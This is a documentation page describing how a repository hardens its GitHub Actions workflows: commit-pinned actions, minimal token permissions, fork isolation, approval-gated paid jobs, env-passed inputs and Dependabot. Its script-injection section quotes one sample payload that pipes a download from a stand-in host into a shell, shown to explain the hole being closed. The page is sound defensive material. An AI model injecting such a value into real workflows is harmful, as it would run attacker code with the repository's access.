# GitHub Actions hardening

GitHub Actions runs this repo's workflows: the files in `.github/workflows/`. A workflow is a list of jobs. A job is a list of steps that run on a GitHub machine. This page explains, in plain words, the six controls that keep those runs safe.

One test file checks all six: `tests/test_workflow_hardening.py`. It reads every workflow file it finds, so a new workflow is checked without a change to the test. Each rule is also run on a small broken workflow, to show that it can fail.

## 1. Actions are pinned to a commit

**What:** A step can run someone else's code, called an action (`uses: actions/checkout@...`). Every action here is named by a full commit SHA: the 40-character id of one exact version of the code. The version number sits next to it as a comment, such as `# v7.0.1`.

**Why:** A tag such as `v7` can be moved to different code by whoever controls the action. A commit SHA can't. So the code that runs is the code that was looked at.

**Where:** Every `uses:` line in `.github/workflows/`. There are eight actions: seven from GitHub (`actions/...`) and `astral-sh/setup-uv`. Each SHA was checked against its version tag on GitHub.

**Test:** `test_every_action_is_pinned_to_a_full_commit_sha_with_its_version_in_a_comment` and `test_an_action_has_the_same_pin_in_every_workflow`.

## 2. The workflow token gets the least it needs

**What:** GitHub gives every job a token: a temporary password for this repo. Each workflow starts with `permissions: {}`, so the token can do nothing. Each job then lists only what it needs. Most jobs have `contents: read` (read the code). The paid jobs add `actions: read` (download the spend ledger an earlier run saved). The approvals check adds `pull-requests: read`. `actions/checkout` is told not to leave the token on disk (`persist-credentials: false`).

**Why:** If a step is tricked, or a dependency turns bad, it can only do what the token allows. A read-only token can't push code, change a pull request or publish anything.

**Where:** The top of each workflow, and each job. Only one job can write: `deploy` in `pages.yml` has `pages: write` and `id-token: write`, which publishing the site needs. The plan pull requests are written by the GitHub App's own short-lived token, not by this one.

**Test:** `test_the_token_starts_with_no_permissions_and_every_job_states_its_own`, `test_the_only_write_permissions_are_the_two_that_publish_the_site` and `test_no_checkout_leaves_the_token_on_disk`.

## 3. Pull requests from forks get no secrets

**What:** Anyone can copy this public repo (a fork) and open a pull request from their copy. Two workflows run on pull requests: `ci.yml` and `access-approvals.yml`. Neither names a secret. No workflow uses `pull_request_target` or `workflow_run`, the two triggers that run with the repo's secrets after a stranger's pull request.

**Why:** A pull request can change the code, and the workflow file, that run for it. If such a run held a secret, a stranger could print it. GitHub already gives a fork's run a read-only token and no secrets. This rule makes sure nothing here needs more, or works around it.

**Where:** The `on:` block of each workflow. `access-approvals.yml` also checks out the base branch, never the pull request's code. Dependabot's pull requests are treated like a fork's.

**Test:** `test_a_workflow_that_runs_on_pull_requests_names_no_secret` and `test_no_workflow_starts_on_an_event_that_runs_a_forks_change_with_secrets`.

## 4. Paid jobs wait for the owner's approval

**What:** Three workflows call the Claude API and cost money: `access-ai-compare.yml`, `access-ai-final.yml` and `access-red-team.yml`. Each can only be started by hand (`workflow_dispatch`). Each job runs in the `access-ai` environment. An environment is a GitHub setting that holds secrets and can make a run wait until a named person approves it. Each job also has `if: github.ref == 'refs/heads/main'`, so it is skipped on any other branch.

**Why:** The API key is stored in the environment, not with the repo's general secrets. A job gets it only after the owner clicks Approve, and only for code on `main`. Editing the `if:` out on another branch doesn't help: the environment itself accepts only `main`.

**Where:** `environment: access-ai` and the `if:` line of each paid job. The key goes to one step only, the one that makes the calls. The spend cap is a separate control (ADR-037).

**Test:** `test_every_paid_job_waits_for_the_owners_approval_and_runs_from_main_only`. It finds a paid job by its text: the key's name, `ACCESS_AI_LIVE` or `--no-dry-run`.

## 5. Inputs reach scripts through env

**What:** Some values come from outside: what a person types when starting a workflow (`inputs`), or the details of a pull request (`github.event`). GitHub pastes a `${{ ... }}` expression into a script as text, before the script runs. So no `run:` script here contains `${{ }}` at all. The value goes into an environment variable under `env:`, and the script reads `"$NAME"`.

**Why:** A pasted value becomes part of the script. A value such as `"; curl evil.example | sh` would then run as a command. This is called script injection. An environment variable is only ever data.

**Where:** `APPROVALS` in `access-apply.yml`, `FINAL_K` in `access-ai-final.yml`, `REDTEAM_K` and `REDTEAM_MODELS` in `access-red-team.yml`, and the pull request fields in `access-approvals.yml`.

**Test:** `test_no_run_script_has_an_expression_in_it`.

## 6. Dependabot keeps the pins fresh

**What:** Dependabot is GitHub's bot that opens a pull request when a dependency has a newer version. `.github/dependabot.yml` has two entries, both weekly. `github-actions` updates the pinned SHAs and their version comments. `uv` updates the Python versions in the `pyproject.toml` files and in `uv.lock` together.

**Why:** A pin never changes by itself, so it never gets a security fix by itself either. Dependabot proposes the change, CI runs on it, and the owner reviews it like any other pull request (ADR-011).

**Where:** `.github/dependabot.yml`. Minor and patch updates are grouped into one pull request per entry, and a major version gets its own. At most 3 are open per entry. The entry is `uv` and not `pip`, because `pip` doesn't rewrite `uv.lock`, and CI installs with `uv sync --locked`, which fails when the lock is out of date. The workspace's own four packages are on the ignore list, so they are never looked up on a public package index.

**Good to know:** Dependabot's support for uv workspaces is young. If one of its pull requests leaves `uv.lock` out of step, CI fails and the pull request can't be merged. Three tests in `access/tests/` name the SHA of `upload-artifact`, `download-artifact` and `create-github-app-token`: a pull request that moves one of those fails CI until the same SHA is changed in those tests. The uv version itself (`0.13.7` in each workflow) is not updated by Dependabot.

**Test:** `test_dependabot_updates_the_actions_and_the_uv_lock_in_few_pull_requests` and `test_dependabot_never_looks_up_the_workspaces_own_packages`.

## What you need to click in GitHub

These settings live in GitHub, not in the repo. No test can see them, and nothing in this repo changes them. The values below were read through GitHub's API on 2026-11-18, with the API's own name for each in brackets.

Already as they should be, nothing to click:

- **Settings → Actions → General → Workflow permissions:** "Read repository contents and packages permissions" is selected (`default_workflow_permissions: read`), and "Allow GitHub Actions to create and approve pull requests" is off.
- **Settings → Environments → access-ai:** required reviewer `kstarev`; deployment branches: `main` only; "Allow administrators to bypass configured protection rules" is off; `ANTHROPIC_API_KEY` is an environment secret here and not a repository secret. "Prevent self-review" is off, and has to stay off while one person both starts and approves the runs.
- **Settings → Environments → github-pages:** deployment branches: `main` only.
- **Settings → Advanced Security:** secret scanning and push protection are on.

To click:

1. **Settings → Advanced Security → Dependabot alerts → Enable.** Now: off. Without it GitHub doesn't tell you about a known vulnerability in a dependency.
2. **Settings → Advanced Security → Dependabot security updates → Enable.** Now: off. With it, Dependabot opens a pull request for a vulnerable dependency straight away, not at the weekly check.
3. **Insights → Dependency graph → Dependabot**, once this is merged: check that both entries are listed with no error. Version updates start by themselves from `.github/dependabot.yml`, and the file can only be checked by GitHub.
4. **Settings → Actions → General → Approval for running fork pull request workflows from contributors → "Require approval for all external contributors"** (older name: all outside collaborators). Now: "Require approval for first-time contributors" (`first_time_contributors`).
5. **Settings → Actions → General → Actions permissions → "Allow kstarev, and select non-kstarev, actions and reusable workflows"**, then tick "Allow actions created by GitHub" and add `astral-sh/setup-uv@*` to the list. Now: "Allow all actions and reusable workflows" (`allowed_actions: all`).
6. **Settings → Actions → General → Actions permissions → "Require actions to be pinned to a full-length commit SHA".** Now: off (`sha_pinning_required: false`). Optional: it makes GitHub enforce control 1 as well as the test.
7. **Settings → Advanced Security → Code Security → CodeQL analysis → Set up → Default.** Now: not configured. Optional: ADR-011 lists CodeQL, and it can also scan the workflow files.

Not a click, but worth knowing: `ACCESS_APP_PRIVATE_KEY` (**Settings → Secrets and variables → Actions**) is a repository secret, so a workflow on any branch of this repo can read it. Today only `kstarev` can push a branch. If someone else ever gets write access, move that key into an environment limited to `main` first.
